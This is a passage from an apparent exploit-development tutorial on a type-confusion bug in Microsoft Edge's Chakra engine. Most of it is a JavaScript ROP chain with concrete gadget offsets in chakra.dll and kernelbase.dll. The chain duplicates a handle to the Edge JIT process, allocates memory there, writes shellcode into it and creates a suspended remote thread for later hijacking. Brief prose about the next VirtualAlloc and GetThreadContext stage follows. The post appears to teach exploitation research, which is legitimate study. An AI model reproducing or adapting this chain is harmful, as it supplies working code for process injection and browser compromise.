write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72e128, chakraHigh);      // .data pointer from chakra.dll with a non-zero value to bypass cmp r8d, [rax] future gadget
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server;
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hSourceProcessHandle (RCX)
// Handle to the JIT process from the content process
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], jitHandle[0], jitHandle[1]);         // PROCESS_DUP_HANDLE HANDLE to JIT server
next();

// Call KERNELBASE!DuplicateHandle
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], duplicateHandle[0], duplicateHandle[1]); // KERNELBASE!DuplicateHandle (Recall this was our original leaked pointer var for kernelbase.dll)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!DuplicateHandle)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!DuplicateHandle - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // DWORD dwDesiredAccess (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // BOOL bInheritHandle (RSP+0x30)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000002, 0x00000000);             // DWORD dwOptions (RSP+0x38)
next();

// VirtuaAllocEx() ROP chain
// Stage 2 -> Allocate memory in the Edge JIT process (we have a full handle there now)

// DWORD flAllocationType (R9)
// MEM_RESERVE (0x00002000) | MEM_COMMIT (0x00001000)
/*
0:031> ? 0x00002000 | 0x00001000 
Evaluate expression: 12288 = 00000000`00003000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00003000, 0x00000000);             // MEM_RESERVE | MEM_COMMIT
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// SIZE_T dwSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // 0x1000 (shellcode size)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x24628b, chakraHigh);      // 0x18024628b: mov r8, rdx ; add rsp, 0x48 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x48
next();

// LPVOID lpAddress (RDX)
// Let VirtualAllocEx decide where the memory will be located
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL address (let VirtualAllocEx deside where we allocate memory in the JIT process)
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which will hold full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     				   // Recall RAX already has a writable pointer in it

// Call KERNELBASE!VirtualAllocEx
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xff00, kernelbaseHigh); // KERNELBASE!VirtualAllocEx address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!VirtualAllocEx)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!VirtualAllocEx - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD flProtect (RSP+0x28) (PAGE_READWRITE)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain
// Stage 3 -> Write our shellcode into the JIT process

// Store the VirtualAllocEx return address in the .data section of kernelbase.dll (It is currently in RAX)

/*
0:015> dq kernelbase+0x216000+0x4000 L2
00007fff`58cfa000  00000000`00000000 00000000`00000000
*/
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where we will store VirtualAllocEx allocation
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00001000, 0x00000000);             // SIZE_T nSize (0x1000)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();                                                                     // Recall RAX already has a writable pointer in it

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000-0x8, kernelbaseHigh); // .data section of kernelbase.dll where we have our VirtualAllocEx allocation
next();                                                                            // (-0x8 to compensate for below where we have to read from the address at +0x8 offset
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x255fa0, chakraHigh);      // mov rdx, qword [rdx+0x08] ; mov rax, rdx ; ret
next();

// LPCVOID lpBuffer (R8) (shellcode in chakra.dll .data section)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000, chakraHigh);    	  // .data section of chakra.dll holding our shellcode
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// CreateRemoteThread() ROP chain
// Stage 4 -> Create a thread within the JIT process, but create it suspended
// This will allow the thread to _not_ execute until we are ready
// LPTHREAD_START_ROUTINE can be set to anything, as CFG will check it and we will end up setting RIP directly later
// We will eventually hijack RSP of this thread with a ROP chain, and by setting RIP to a return gadget our thread, when executed, will return into our ROP chain
// We will update the thread later via another ROP chain to call SetThreadContext()

// LPTHREAD_START_ROUTINE lpStartAddress (R9)
// This can be any random data, since it will never be executed
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x28b4fe, chakraHigh);	   // 0x180043c63: Anything we want - this will never get executed
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74e010, chakraHigh);      // .data pointer from chakra.dll which holds our full perms handle to JIT server
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xd2125, chakraHigh);       // 0x1800d2125: mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret (Place duplicated JIT handle into RCX)
next();

// LPSECURITY_ATTRIBUTES lpThreadAttributes (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // NULL (default security properties)
next();

// SIZE_T dwStackSize (R8)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);      // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // 0 (default stack size)
next();

// Call KERNELBASE!CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0xdcfd0, kernelbaseHigh); // KERNELBASE!CreateRemoteThread
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!CreateRemoteThread)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!CreateRemoteThread - 0x180243949: add rsp, 0x38 ; ret
next(); 
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPVOID lpParameter (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000004, 0x00000000);             // DWORD dwCreationFlags (RSP+0x30) (CREATE_SUSPENDED to avoid executing the thread routine)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // LPDWORD lpThreadId (RSP+0x38)
next();

// WriteProcessMemory() ROP chain (Number 2)
// Stage 5 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rcx gadget for lpAddress

// Before, we need to preserve the thread HANDLE returned by CreateRemoteThread
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a100, kernelbaseHigh); // .data section of kernelbase.dll where we will store the thread HANDLE
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret (Write the address for storage)
next();

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetOne, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();

// WriteProcessMemory() ROP chain (Number 3)
// Stage 6 -> Update the final ROP chain, currently in the charka.dll .data section, with the address of our shellcode in the pop rdi gadget for our "fake return address"

// SIZE_T nSize (R9)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x72E128, chakraHigh);      // .data pointer from chakra.dll (ensures future cmp r8d, [rax] gadget writes to a valid pointer)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000008, 0x00000000);             // SIZE_T nSize (0x8)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0xf6270, chakraHigh);       // 0x1800f6270: mov r9, rcx ; cmp r8d,  [rax] ; je 0x00000001800F6280 ; mov al, r10L ; add rsp, 0x28 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x28
next();

// HANDLE hProcess (RCX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);       // 0x180046377: pop rcx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xffffffff, 0xffffffff);             // Current process
next();

// LPVOID lpBaseAddress (RDX)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);       // 0x18001d2c9: pop rdx ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+ropoffsetTwo, chakraHigh); // .data section of chakra.dll where our final ROP chain is
next();                                                                       

// LPCVOID lpBuffer (R8) (Our kernelbase.dll .data section address which points to the value we want to write, the allocation of the VirtualAllocEx allocation)
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x576231, chakraHigh);         // 0x180576231: pop r8 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x21a000, kernelbaseHigh); // .data section of kernelbase.dll where the VirtualAllocEx allocation is stored
next();

// Call KERNELBASE!WriteProcessMemory
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x577fd4, chakraHigh);      // 0x180577fd4: pop rax ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], kernelbaseLo+0x79a40, kernelbaseHigh); // KERNELBASE!WriteProcessMemory address 
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x272beb, chakraHigh);      // 0x180272beb: jmp rax (Call KERNELBASE!WriteProcessMemory)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x243949, chakraHigh);      // "return address" for KERNELBASE!WriteProcessMemory - 0x180243949: add rsp, 0x38 ; ret
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38 (shadow space for __fastcall as well)         
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x00000000, 0x00000000);             // SIZE_T *lpNumberOfBytesWritten (NULL) (RSP+0x28)
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x41414141, 0x41414141);             // Padding for add rsp, 0x38
next();
```

Before the call:

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion144.png" alt="">

After the call:

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion145.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion146.png" alt="">

Again, this is identical to last time and we use the `ropoffsetTwo` variable here, which is just used to essentially calculate the offset from where our `VirtualProtect` ROP chain began to the _actual_ address within the ROP chain we want to update (`lpAddress` and our "fake" return address we want our ROP chain to jump to).

`VirtualAlloc` ROP Chain
---

This next function call may seem a bit confusing - a call to `VirtualAlloc`. We don't really need to call this function, from an exploitation technique perspective. We will (after this function call) make a call to `GetThreadContext` to retrieve the state of the CPU registers for our previously created thread within the JIT process so that we can leak the value of RSP and eventually write our final ROP chain there. A `GetThreadContext` call expects a pointer to a `CONTEXT` structure - where the function will go and fill our the structure with the current CPU register state of a given thread (our remotely created thread).

<img src="{{ site.url }}{{ site.baseurl }}/images/3typeconfusion147.png" alt="">

